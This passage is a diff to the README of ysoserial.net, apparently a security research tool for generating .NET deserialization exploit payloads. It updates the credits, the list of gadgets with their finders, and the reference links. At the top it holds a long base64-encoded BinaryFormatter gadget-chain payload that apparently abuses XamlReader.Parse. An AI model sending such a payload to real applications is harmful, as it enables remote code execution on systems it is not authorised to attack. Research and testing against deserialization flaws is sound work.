NsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUJnc0FBQUF1VTNsemRHVnRMa1oxYm1OZ01sdGJVM2x6ZEdWdExsTjBjbWx1WjEwc1cxTjVjM1JsYlM1UFltcGxZM1JkWFFZTUFBQUFDRzF6WTI5eWJHbGlDZ1lOQUFBQVZWQnlaWE5sYm5SaGRHbHZia1p5WVcxbGQyOXlheXhXWlhKemFXOXVQVFF1TUM0d0xqQXNRM1ZzZEhWeVpUMXVaWFYwY21Gc0xGQjFZbXhwWTB0bGVWUnZhMlZ1UFRNeFltWXpPRFUyWVdRek5qUmxNelVHRGdBQUFDQlRlWE4wWlcwdVYybHVaRzkzY3k1TllYSnJkWEF1V0dGdGJGSmxZV1JsY2dZUEFBQUFCVkJoY25ObENSQUFBQUFFQ1FBQUFDOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjZ1lBQUFBRVRtRnRaUXhCYzNObGJXSnNlVTVoYldVSlEyeGhjM05PWVcxbENWTnBaMjVoZEhWeVpRcE5aVzFpWlhKVWVYQmxFRWRsYm1WeWFXTkJjbWQxYldWdWRITUJBUUVCQUFNSURWTjVjM1JsYlM1VWVYQmxXMTBKRHdBQUFBa05BQUFBQ1E0QUFBQUdGQUFBQUNKVGVYTjBaVzB1VDJKcVpXTjBJRkJoY25ObEtGTjVjM1JsYlM1VGRISnBibWNwQ0FBQUFBb0JDZ0FBQUFrQUFBQUdGUUFBQUFkRGIyMXdZWEpsQ1F3QUFBQUdGd0FBQUExVGVYTjBaVzB1VTNSeWFXNW5CaGdBQUFBclNXNTBNeklnUTI5dGNHRnlaU2hUZVhOMFpXMHVVM1J5YVc1bkxDQlRlWE4wWlcwdVUzUnlhVzVuS1FnQUFBQUtBUkFBQUFBSUFBQUFCaGtBQUFBa1UzbHpkR1Z0TGtOdmJYQmhjbWx6YjI1Z01WdGJVM2x6ZEdWdExsTjBjbWx1WjExZENRd0FBQUFLQ1F3QUFBQUpGd0FBQUFrVkFBQUFDZ3M9Cw==
+
 ```
 
 ## v2 Branch
@@ -443,7 +478,8 @@ Special thanks to all contributors:
 ```
 $ ./ysoserial.exe --credit
 
-ysoserial.net has been developed by Alvaro Muñoz (@pwntester)
+ysoserial.net has been originally developed by Alvaro Munoz (@pwntester)
+this tool is being maintained by Alvaro Munoz (@pwntester) and Soroush Dalili (@irsdl)
 
 Credits for available gadgets:
 	ActivitySurrogateDisableTypeCheck
@@ -456,10 +492,16 @@ Credits for available gadgets:
 		[Finders: Soroush Dalili]
 	ClaimsIdentity
 		[Finders: Soroush Dalili]
+	ClaimsPrincipal
+		[Finders: jang]
 	DataSet
 		[Finders: James Forshaw] [Contributors: Soroush Dalili]
+	DataSetTypeSpoof
+		[Finders: James Forshaw] [Contributors: Soroush Dalili, Markus Wulftange, Jang]
 	ObjectDataProvider
 		[Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz, Soroush Dalili, Dane Evans]
+	ObjRef
+		[Finders: Markus Wulftange]
 	PSObject
 		[Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz]
 	ResourceSet
@@ -477,7 +519,7 @@ Credits for available gadgets:
 	TypeConfuseDelegate
 		[Finders: James Forshaw] [Contributors: Alvaro Munoz]
 	TypeConfuseDelegateMono
-		[Finders: James Forshaw] [Contributors: Denis Andzakovic]
+		[Finders: James Forshaw] [Contributors: Denis Andzakovic, Soroush Dalili]
 	WindowsClaimsIdentity
 		[Finders: Soroush Dalili]
 	WindowsIdentity
@@ -575,7 +617,8 @@ Please see https://github.com/pwntester/ysoserial.net/graphs/contributors to fin
 - https://www.mdsec.co.uk/2022/03/abc-code-execution-for-veeam/
 - https://www.mandiant.com/resources/hunting-deserialization-exploits
 - https://mogwailabs.de/en/blog/2022/01/vulnerability-spotlight-rce-in-ajax.net-professional/
-
+- https://testbnull.medium.com/some-notes-of-microsoft-exchange-deserialization-rce-cve-2021-42321-f6750243cdcd
+- https://testbnull.medium.com/note-nhanh-v%E1%BB%81-binaryformatter-binder-v%C3%A0-cve-2022-23277-6510d469604c
 
 ### Talks:
 - https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf
